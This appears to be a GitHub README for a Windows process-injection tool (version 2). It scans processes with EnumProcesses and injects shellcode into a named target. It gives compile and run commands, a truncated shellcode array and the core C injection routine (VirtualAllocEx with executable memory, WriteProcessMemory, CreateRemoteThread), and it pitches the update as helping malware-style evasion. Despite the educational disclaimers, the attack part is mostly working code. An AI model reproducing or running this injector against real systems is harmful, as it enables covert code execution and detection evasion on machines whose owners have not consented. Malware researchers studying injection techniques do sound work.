

# Process Scanner & Shellcode Injector (v2)

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&width=435&lines=Process+Injection+Techniques+Update;Windows+Remote+Process+Scanner+&+Shellcode+Injector+v2;" alt="Typing SVG" /></a>

This is the second version of a powerful Windows tool designed to scan for a specific process by its name and inject shellcode into it. This version introduces enhancements over the first version, offering improved process enumeration techniques for more comprehensive scanning. The tool remains targeted for educational purposes and malware analysis, showing how process injection works within Windows environments.

**Note**: This tool is intended for controlled environments like malware research, pentesting, or debugging. It should never be used for malicious purposes.

---

## New in Version 2

In the first version, we used `CreateToolHelp32Snapshot` for process enumeration, which, although effective, might not capture all processes in certain scenarios. **This second version replaces `CreateToolHelp32Snapshot` with `EnumProcesses`**, offering a more thorough approach to process enumeration. 

**Why the update?**  
Malware authors often seek to evade detection by implementing process scanning techniques in various ways. By using multiple approaches for process enumeration, they increase unpredictability in their behavior. This version demonstrates an alternative technique that broadens the scope of scanning, making the tool more robust and unpredictable.

---

## Features

- Scans through all active processes using `EnumProcesses`.
- Locates a target process based on user input.
- Injects shellcode into the identified process.
- Provides detailed feedback and logs during the injection process.

---

## Prerequisites

- **Operating System**: Windows (requires admin privileges)
- **Compiler**: MinGW or Visual Studio (MSVC)
- **Windows SDK**: Required for process enumeration and memory manipulation APIs.
- **Knowledge**: Familiarity with shellcode and process injection principles.

---

## How It Works

This version now uses the `EnumProcesses` API to enumerate all active processes in the system. Once the list of processes is obtained, each process is opened and its name is retrieved using `GetModuleBaseName`. The name is compared with the user-provided target, and if matched, the shellcode is injected using a similar approach to the first version: memory allocation, shellcode writing, and remote thread creation.

### Injection Workflow:

1. **Process Scanning**: Scans all processes using `EnumProcesses` to get a full list of running processes.
2. **Process Name Matching**: Retrieves and compares each process’s name to the target process name.
3. **Process Opening**: Opens the identified target process with `PROCESS_ALL_ACCESS` privileges.
4. **Memory Allocation**: Allocates executable memory in the target process.
5. **Shellcode Injection**: Injects shellcode into the allocated memory.
6. **Remote Thread Execution**: Creates a remote thread in the target process to execute the shellcode.

---

## Usage

### Clone the repository:
```bash
git clone https://github.com/your-username/process-scanner-shellcode-injector.git
cd process-scanner-shellcode-injector
```

### Compile the Program:

#### Using MinGW (`gcc`):
```bash
gcc -o scanner_injector.exe scanner_injector.c -lkernel32 -luser32 -lpsapi
```

#### Using Visual Studio:
- Open the provided solution in Visual Studio.
- Build the solution (Ctrl + Shift + B).

---

### Run the Program:
```bash
scanner_injector.exe <ProcessName>
```

#### Example:
```bash
scanner_injector.exe notepad.exe
```

### Example Output:
```bash
Found the process: notepad.exe with PID: 1234
Allocated 512 bytes with PAGE_EXECUTE_READWRITE permissions inside PID 1234
Injected 512 bytes of shellcode into process memory
Created a remote thread with ID 5678 in the target process
```

---

## Shellcode Example

Modify the example shellcode (`R0m4InShell[]`) based on your requirements. Make sure that the shellcode is appropriate for testing purposes.

```c
unsigned char R0m4InShell[] = {
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
    // ... additional bytes truncated
};
```

---

## Code Breakdown

The following snippet illustrates the core part of the updated process enumeration using `EnumProcesses` and the rest of the injection logic:

```c
DWORD aProcesses[1024], cbNeeded, cProcesses;
if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
    return 1;
}

cProcesses = cbNeeded / sizeof(DWORD);
for (unsigned int i = 0; i < cProcesses; i++) {
    if (aProcesses[i] != 0) {
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
        if (hProcess != NULL) {
            GetModuleBaseName(hProcess, NULL, szProcessName, sizeof(szProcessName)/sizeof(TCHAR));
            if (wcscmp(szProcessName, target) == 0) {
                PID = aProcesses[i];
                break;
            }
            CloseHandle(hProcess);
        }
    }
}

hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, rBuffer, R0m4InShell, sizeof(R0m4InShell), NULL);
hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
```

---

## Disclaimer

This tool is for **educational purposes only**. Misuse of this tool can lead to severe legal consequences. The developer is not responsible for any damages caused by the misuse of this tool. Always ensure you have the proper permissions to test and inject into processes, especially in production environments.
